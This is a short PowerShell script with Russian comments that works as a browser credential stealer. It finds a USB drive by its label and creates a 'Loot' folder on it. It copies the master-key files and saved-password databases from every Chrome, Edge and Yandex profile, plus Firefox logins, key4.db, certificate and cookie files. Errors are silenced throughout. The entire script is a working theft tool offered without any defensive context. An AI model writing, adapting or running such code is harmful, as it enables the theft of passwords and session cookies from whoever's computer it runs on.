# 1. Поиск флешки по метке
$usb = Get-Volume | Where-Object { $_.FileSystemLabel -eq "P81_DATA" } | Select-Object -ExpandProperty DriveLetter
if (!$usb) { exit }

# 2. Создание папки для сбора (название — время)
$time = Get-Date -Format "HH_mm_ss"
$dest = "$($usb):\Loot\$time"
New-Item -ItemType Directory -Path $dest -Force | Out-Null

# 3. Сбор Chromium-браузеров (Chrome, Edge, Yandex)
$browsers = @(
    @{n="CHROME"; p="Google\Chrome\User Data"},
    @{n="EDGE"; p="Microsoft\Edge\User Data"},
    @{n="YANDEX"; p="Yandex\YandexBrowser\User Data"}
)

foreach ($b in $browsers) {
    $uPath = Join-Path $env:LOCALAPPDATA $b.p
    if (Test-Path $uPath) {
        # Копируем мастер-ключ
        $ls = Join-Path $uPath "Local State"
        if (Test-Path $ls) { copy-item $ls -Destination "$dest\$($b.n)_MASTER_KEY" -Force -ErrorAction SilentlyContinue }
        
        # Копируем базы паролей из всех профилей
        Get-ChildItem -Path $uPath -Recurse -Filter "Login Data" -ErrorAction SilentlyContinue | ForEach-Object {
            $profile = $_.Directory.Name
            copy-item $_.FullName -Destination "$dest\$($b.n)_PROFILE_$($profile)_LOGINS.db" -Force -ErrorAction SilentlyContinue
        }
    }
}

# 4. Сбор Firefox
$ffPath = "$env:APPDATA\Mozilla\Firefox\Profiles"
if (Test-Path $ffPath) {
    Get-ChildItem -Path $ffPath -Directory | ForEach-Object {
        $p = $_.FullName
        $n = $_.Name
        copy-item (Join-Path $p "logins.json") -Destination "$dest\FF_$($n)_logins.json" -ErrorAction SilentlyContinue
        copy-item (Join-Path $p "key4.db") -Destination "$dest\FF_$($n)_key4.db" -ErrorAction SilentlyContinue
        copy-item (Join-Path $p "cert9.db") -Destination "$dest\FF_$($n)_cert9.db" -ErrorAction SilentlyContinue
        copy-item (Join-Path $p "cookies.sqlite") -Destination "$dest\FF_$($n)_cookies.sqlite" -ErrorAction SilentlyContinue
    }
}

exit
